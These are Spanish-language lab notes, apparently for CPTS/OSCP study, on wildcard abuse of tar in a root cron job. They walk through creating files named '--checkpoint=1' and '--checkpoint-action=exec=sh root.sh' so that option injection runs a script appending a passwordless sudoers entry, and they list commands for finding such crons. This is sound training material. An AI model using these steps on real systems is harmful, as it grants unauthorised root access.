
## 1. ¿Qué es Wildcard Abuse?

Los **comodines (wildcards)** son caracteres especiales que la shell utiliza para buscar y expandir nombres de archivos.

|Comodín|Función|
|---|---|
|`*`|Coincide con cualquier número de caracteres.|
|`?`|Coincide con un único carácter.|
|`[abc]`|Coincide con cualquiera de los caracteres indicados.|
|`[a-z]`|Coincide con un rango de caracteres.|
|`~`|Representa el directorio personal del usuario.|

El **Wildcard Abuse** consiste en aprovechar la expansión de comodines para introducir argumentos maliciosos en comandos ejecutados por procesos privilegiados.

## 2. Explotación mediante tar

El comando `tar` permite crear archivos comprimidos y dispone de dos opciones interesantes:

```
--checkpoint=1
--checkpoint-action=exec=COMANDO
```

- `--checkpoint=1`: establece un checkpoint cada registro.
    
- `--checkpoint-action=exec=COMANDO`: ejecuta un comando al alcanzar un checkpoint.
    

### Escenario vulnerable

Encontramos un cron job ejecutado como `root`:

```
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Este cron realiza una copia de seguridad cada minuto.

**Vulnerabilidad:** utiliza `*` para seleccionar los archivos del directorio.

Si podemos crear archivos en ese directorio, podemos introducir nombres que `tar` interpretará como argumentos.

## 3. Explotación paso a paso

### Paso 1. Crear un script malicioso

Creamos un script que concederá permisos de `sudo` sin contraseña a nuestro usuario:

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

### Paso 2. Crear archivos con nombres especiales

```
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Estos archivos contienen los argumentos que queremos introducir en `tar`.

### Paso 3. Esperar a que se ejecute el cron

Cuando el cron ejecute:

```
tar -zcf /home/htb-student/backup.tar.gz *
```

La shell expandirá `*` e incluirá nuestros archivos.

De esta manera, `tar` recibirá los argumentos:

```
--checkpoint=1
--checkpoint-action=exec=sh root.sh
```

Esto provocará que se ejecute `root.sh` con los privilegios de `root`.

### Paso 4. Comprobar los privilegios

```
sudo -l
```

Resultado esperado:

```
(root) NOPASSWD: ALL
```

Ahora podemos obtener una shell como `root`:

```
sudo su
```

## 4. ¿Qué buscar durante la enumeración?

Revisar los cron jobs:

```
cat /etc/crontab
ls -la /etc/cron.d/
```

Buscar comandos `tar` que utilicen comodines:

```
grep -R "tar .*[*]" /etc/cron* 2>/dev/null
```

Comprobar si tenemos permisos de escritura sobre el directorio utilizado:

```
ls -ld /ruta/directorio
```

### Clave para CPTS / OSCP

**Buscar tareas programadas ejecutadas como** `**root**` **que utilicen** `**tar**` **con** `*****` **sobre directorios donde tengamos permisos de escritura.**

Si podemos crear archivos con nombres que comiencen por `--`, podremos intentar inyectar opciones como `--checkpoint-action` para ejecutar comandos con los privilegios del proceso.
